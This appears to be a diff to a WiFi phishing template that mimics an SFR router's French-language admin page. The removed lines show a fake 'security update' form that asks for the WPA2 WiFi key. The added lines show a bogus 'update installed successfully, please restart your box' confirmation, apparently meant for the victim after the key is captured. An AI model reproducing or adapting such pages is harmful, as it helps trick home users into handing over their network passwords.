@@ -118,6 +118,7 @@ div#global {
 $(document).ready(function() {
 
 
+
 	function httpGet(theUrl) {
 	  var xmlHttp = new XMLHttpRequest();
 	  xmlHttp.open("GET", theUrl, false); // false for synchronous request
@@ -358,27 +359,11 @@ $(document).ready(function() {
 <table id="page-table"><tbody><tr>
       <td id="page-td"><table width="700" cellspacing="5" cellpadding="5" border="0" align="center">
 		<tbody><tr>
-			<td class="centrer" colspan="2" valign="middle"><p>Une mise à jour importante de sécurité est disponible pour votre box SFR.<br>
-			Veuillez entrer votre clé WPA2 (mot de passe WiFi) pour installer la mise à jour:</p>
+			<td class="centrer" colspan="2" valign="middle"><p>La mise à jour a été installée avec succès. Veuillez maintenant redémarrer votre box SFR.</p>
 			</td>
 			</tr>
-        <tr>
-          <td class="adroite" width="45%" valign="middle"><span class="fontestableau">Mot de passe</span></td>
-          <td valign="middle" align="left">
-            <input id="loginPassword" name="loginPassword" size="30" maxlength="127" value="" type="password">
-          </td>
-        </tr>
-        <tr>
-          <td class="adroite" width="45%" valign="middle"><span class="fontestableau">Confirmation</span></td>
-          <td valign="middle" align="left"><input id="loginPasswordConfirm" name="loginPasswordConfirm" size="30" maxlength="127" value="" type="password"></td>
-        </tr><tr>
-          <td colspan="2" class="centrer" valign="middle" align="center"><p><br>
-            <button id="envoyer" class="num-button2" type="button">OK</button>
-          </p></td>
-        </tr>
       </tbody></table>
         
-      <p class="fontestableau">Le mot de passe par défaut se trouvent sous votre modem.      </p>
       </td></tr>
       </tbody></table><br>
 
